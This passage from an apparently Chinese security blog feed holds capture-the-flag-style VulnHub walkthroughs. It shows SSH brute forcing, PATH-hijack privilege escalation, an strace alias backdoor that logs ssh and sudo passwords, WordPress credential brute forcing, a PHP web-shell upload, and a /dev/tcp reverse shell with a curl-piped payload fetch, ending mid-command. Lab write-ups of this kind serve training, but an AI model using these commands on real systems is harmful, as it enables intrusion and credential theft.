&lt;p&gt;可以用 Navicat 进入数据库&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-297.png&#34; width=&#34;580&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;也可以登陆到服务器之后对这些表进行查看&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-298.png&#34; width=&#34;400&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;-&amp;gt; 找到一些 base64 加密后的密码以及一些用户名&lt;/p&gt;
&lt;h3 id=&#34;hydra-爆破密码&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#hydra-爆破密码&#34;&gt;#&lt;/a&gt; hydra 爆破密码&lt;/h3&gt;
&lt;p&gt;将用户名和解密后的密码加载到本地&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-299.png&#34; width=&#34;420&#34; alt=&#34;Image&#34;&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;用hydra破解:&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;hydra -L user.txt -P pass.txt ssh://192.168.31.50&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-300.png&#34; width=&#34;520&#34; alt=&#34;Image&#34;&gt;
&lt;h3 id=&#34;服务器信息收集&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#服务器信息收集&#34;&gt;#&lt;/a&gt; 服务器信息收集&lt;/h3&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-301.png&#34; width=&#34;550&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;寻找是否有可利用的 s 权限的文件&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-302.png&#34; width=&#34;450&#34; alt=&#34;Image&#34;&gt;
&lt;h3 id=&#34;篡改环境变量提权&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#篡改环境变量提权&#34;&gt;#&lt;/a&gt; 篡改环境变量提权&lt;/h3&gt;
&lt;p&gt;strings 命令用于查看二进制文件中可打印的字符&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-303.png&#34; width=&#34;400&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;发现 /opt/get_access 会执行 cat 命令&lt;br&gt;
因此可以伪造 cat 命令，修改环境变量，使 get_access 执行一个伪造的 cat&lt;/p&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;export PATH=/tmp:$PATH&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;echo ‘/bin/bash’ &amp;gt; /tmp/cat&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Chmod +x /tmp/cat&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;/opt/get_access&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-304.png&#34; width=&#34;360&#34; alt=&#34;Image&#34;&gt;
&lt;h3 id=&#34;strace-后门&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#strace-后门&#34;&gt;#&lt;/a&gt; strace 后门&lt;/h3&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;查看是否存在其他的strace监控键盘记录，有的话通过&lt;span class=&#34;built_in&#34;&gt;kill&lt;/span&gt; - 9 &lt;span class=&#34;built_in&#34;&gt;id&lt;/span&gt;删掉&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;alias | grep ssh &amp;amp;&amp;amp; ps -ef | grep strace&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;修改环境变量&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;cat &amp;gt;&amp;gt; ~/.bashrc &amp;lt;&amp;lt; EOF&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;alias ssh=&amp;#x27;strace -f -e trace=read,write -o /tmp/.ssh-`date +%d%h%m%s`.log -s 32 ssh&amp;#x27;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;alias sudo=&amp;#x27;strace -f -e trace=read,write -o /tmp/.sudo-`date &amp;#x27;+%d%h%m%s&amp;#x27;`.log -s 32&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;sudo&amp;#x27;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;alias su=&amp;#x27;strace -f -e trace=read,write -o /tmp/.su-`date &amp;#x27;+%d%h%m%s&amp;#x27;`.log -s 32 su&amp;#x27;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;EOF&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;运行环境变量&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;source ~/.bashrc&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-305.png&#34; width=&#34;520&#34; alt=&#34;Image&#34;&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;监听/tmp文件下新增的.ssh文件&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;watch -n1 ls -Alh /tmp&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;找出此阶段内登陆到此服务器的密码的记录,无论正确与否都会被监听&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;cat /tmp/.ssh-09May051652090355.log&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-306.png&#34; width=&#34;520&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;-&amp;gt; strace 后门监控键盘有失败的时候，原因未知&lt;/p&gt;
 ]]></description>
        </item>
        <item>
            <guid isPermalink="true">https://n1h1l157.github.io/2021/11/01/VULNHUB/107%20RECON/</guid>
            <title>VULNHUB 7 RECON</title>
            <link>https://n1h1l157.github.io/2021/11/01/VULNHUB/107%20RECON/</link>
            <category>VULNHUB 1-10</category>
            <pubDate>Mon, 01 Nov 2021 00:00:00 +0800</pubDate>
            <description><![CDATA[ &lt;p&gt;靶机下载地址：&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93d3cudnVsbmh1Yi5jb20vZW50cnkvcmVjb24tMSw0Mzgv&#34;&gt;https://www.vulnhub.com/entry/recon-1,438/&lt;/span&gt;&lt;br&gt;
 教程链接地址：&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9yZWFkeXNldGV4cGxvaXQud29yZHByZXNzLmNvbS8yMDIyLzAzLzA2L3Z1bG5odWItcmVjb24tMS8=&#34;&gt;https://readysetexploit.wordpress.com/2022/03/06/vulnhub-recon-1/&lt;/span&gt;&lt;/p&gt;
&lt;h3 id=&#34;确认攻击目标&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#确认攻击目标&#34;&gt;#&lt;/a&gt; 确认攻击目标&lt;/h3&gt;
&lt;p&gt;攻击机 KALI： 192.168.31.135&lt;br&gt;
 靶机 RECON：桥接于 192.168.31.1 的网卡，ip 未知&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;通过 netdiscover 扫描当前网卡里边有哪些机器&lt;br&gt;
 &lt;code&gt;sudo netdiscover -i eth0 -r 192.168.31.0/24&lt;/code&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;将所有已知的 ip 暂时存档，对这类 ip 地址不做端口扫描&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;shell&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;cat &amp;gt; myip.txt &amp;lt;&amp;lt; EOF&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;192.168.31.1 192.168.31.25 192.168.31.58 192.168.31.86 192.168.31.33&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;192.168.31.120 192.168.31.135 192.168.31.145 192.168.31.162 192.168.31.44&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;EOF&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;ol start=&#34;3&#34;&gt;
&lt;li&gt;去除一些已知 ip 的机器，对剩余 IP 进行端口扫描，判断目标 IP&lt;br&gt;
 &lt;code&gt;sudo nmap -PA 192.168.31.0/24 --excludefile myip.txt&lt;/code&gt;&lt;/li&gt;
&lt;/ol&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-103.png&#34; width=&#34;600&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;-&amp;gt; 目标机器的 ip 地址： 192.168.31.230&lt;/p&gt;
&lt;ol start=&#34;4&#34;&gt;
&lt;li&gt;确认靶机 ip 开放的端口信息&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;&lt;code&gt;sudo nmap -A -p 1-1024 192.168.31.230 -oN /tmp/recon.txt&lt;/code&gt; &lt;br&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-104.png&#34; width=&#34;540&#34; alt=&#34;Image&#34;&gt;&lt;/p&gt;
&lt;p&gt;-&amp;gt; 靶机开放端口 22,80&lt;/p&gt;
&lt;h3 id=&#34;wpscan-扫描-wordpress&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#wpscan-扫描-wordpress&#34;&gt;#&lt;/a&gt; wpscan 扫描 wordpress&lt;/h3&gt;
&lt;p&gt;1）目录扫描&lt;/p&gt;
&lt;p&gt;&lt;code&gt;dirsearch -u http://192.168.31.230/&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-105.png&#34; alt&gt;&lt;/p&gt;
&lt;p&gt;-&amp;gt; 敏感网址：&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovLzE5Mi4xNjguMzEuMjMwL3dwLWxvZ2luLnBocD9yZWRpcmVjdF90bz1odHRwJTNBJTJGJTJGMTkyLjE2OC4zMS4yMzAlMkZ3cC1hZG1pbiUyRiZhbXA7cmVhdXRoPTE=&#34;&gt;http://192.168.31.230/wp-login.php?redirect_to=http%3A%2F%2F192.168.31.230%2Fwp-admin%2F&amp;amp;reauth=1&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovLzE5Mi4xNjguMzEuMjMwL3dwLWxvZ2luLnBocA==&#34;&gt;http://192.168.31.230/wp-login.php&lt;/span&gt;&lt;br&gt;
 对此网址进行弱口令爆破，sql 注入均无效果&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-106.png&#34; alt&gt;&lt;/p&gt;
&lt;ol start=&#34;2&#34;&gt;
&lt;li&gt;wordpress 进行扫描用户&lt;/li&gt;
&lt;/ol&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;获取到wpscan的api token：&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;https://wpscan.com/profile?pricingList=1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;通过以下命令枚举wordpress的用户名：&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;wpscan --url http://192.168.31.230 --enumerate u --api-token eG5iT4ooiuP7eVJVedsHhlgx8xeZHmAJjBr13asnjEc&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-107.png&#34; width=&#34;520&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;-&amp;gt; 用户 1:recon  用户 2:reconauthor&lt;/p&gt;
&lt;ol start=&#34;3&#34;&gt;
&lt;li&gt;wordpress 针对已知用户扫描密码&lt;/li&gt;
&lt;/ol&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;通过以下命令爆破wordpress用户名recon reconauthor的密码：&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;wpscan --url http://192.168.31.230/ - U &amp;#x27;recon reconauthor&amp;#x27; -P /usr/share/wordlists/rockyou.txt --api-token eG5iT4ooiuP7eVJVedsHhlgx8xeZHmAJjBr13asnjEc&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-108.png&#34; width=&#34;520&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;-&amp;gt; 用户：reconauthor 密码：football7&lt;/p&gt;
&lt;ol start=&#34;4&#34;&gt;
&lt;li&gt;登陆 wordpress 后台&lt;br&gt;
&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovLzE5Mi4xNjguMzEuMjMwL3dwLWxvZ2luLnBocA==&#34;&gt; http://192.168.31.230/wp-login.php&lt;/span&gt;&lt;br&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-109.png&#34; alt&gt;&lt;br&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-110.png&#34; alt&gt;&lt;/li&gt;
&lt;/ol&gt;
&lt;h3 id=&#34;msf-测试-wordpress&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#msf-测试-wordpress&#34;&gt;#&lt;/a&gt; msf 测试 wordpress&lt;/h3&gt;
&lt;ol&gt;
&lt;li&gt;msf 自带 exploit/unix/webapp/ 下的模块进行利用&lt;br&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-111.png&#34; alt&gt;&lt;/li&gt;
&lt;/ol&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;msfconsole&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;use exploit/unix/webapp/wp_admin_shell_upload&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;set password **football7**&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;set rhosts 192.168.31. 230&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;set username **reconauthor**&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;set targeturi /&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;run&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;-&amp;gt; 认证成功，但上传失败&lt;/p&gt;
&lt;h3 id=&#34;后台上传-poc&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#后台上传-poc&#34;&gt;#&lt;/a&gt; 后台上传 poc&lt;/h3&gt;
&lt;ol&gt;
&lt;li&gt;从网站后台寻找突破&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;wordpress 后台上传文件 poc：&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93d3cuZXhwbG9pdC1kYi5jb20vZXhwbG9pdHMvNDY5ODE=&#34;&gt;https://www.exploit-db.com/exploits/46981&lt;/span&gt;&lt;br&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-112.png&#34; alt&gt;&lt;/p&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;echo &amp;quot;&amp;lt;html&amp;gt;I’m X_T, do you know me ?&amp;lt;/html&amp;gt;&amp;quot; &amp;gt; index.html&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;echo &amp;quot;&amp;lt;?php echo system($_GET[&amp;#x27;X_T&amp;#x27;]); ?&amp;gt;&amp;quot; &amp;gt; index.php&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;zip poc.zip index.html index.php&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-113.png&#34; width=&#34;520&#34; alt=&#34;Image&#34;&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;依次按下列按钮点击&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Create a new Post -&amp;gt; Select `Add block` -&amp;gt; E-Learning -&amp;gt; Upload the poc.zip -&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Insert as: Iframe -&amp;gt; Insert&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-114.png&#34; alt&gt;&lt;br&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-115.png&#34; alt&gt;&lt;br&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-116.png&#34; alt&gt;&lt;br&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-117.png&#34; alt&gt;&lt;br&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-118.png&#34; alt&gt;&lt;/p&gt;
&lt;p&gt;-&amp;gt; &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovLzE5Mi4xNjguMzEuMjMwL3dwLWNvbnRlbnQvdXBsb2Fkcy9hcnRpY3VsYXRlX3VwbG9hZHMvcG9jOS9pbmRleC5odG1s&#34;&gt;http://192.168.31.230/wp-content/uploads/articulate_uploads/poc9/index.html&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-119.png&#34; alt&gt;&lt;/p&gt;
&lt;p&gt;-&amp;gt; RCE 地址：&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovLzE5Mi4xNjguMzEuMjMwL3dwLWNvbnRlbnQvdXBsb2Fkcy9hcnRpY3VsYXRlX3VwbG9hZHMvcG9jOS9pbmRleC5waHA/WF9UPWxz&#34;&gt;http://192.168.31.230/wp-content/uploads/articulate_uploads/poc9/index.php?X_T=ls&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-120.png&#34; alt&gt;&lt;/p&gt;
&lt;ol start=&#34;2&#34;&gt;
&lt;li&gt;通过 RCE 漏洞反弹 shell&lt;/li&gt;
&lt;/ol&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;构造反弹shell地代码并开启http服务&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;cat &amp;gt; shell.sh &amp;lt;&amp;lt; EOF&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;#&lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;! /bin/bash&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;bash -c &amp;#x27;bash -i &amp;gt;&amp;amp; /dev/tcp/192.168.31.135/4444 0&amp;gt;&amp;amp;1&amp;#x27;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;EOF&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;在靶机上执行：&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;curl http://www.chentuo.asia/shell.sh | 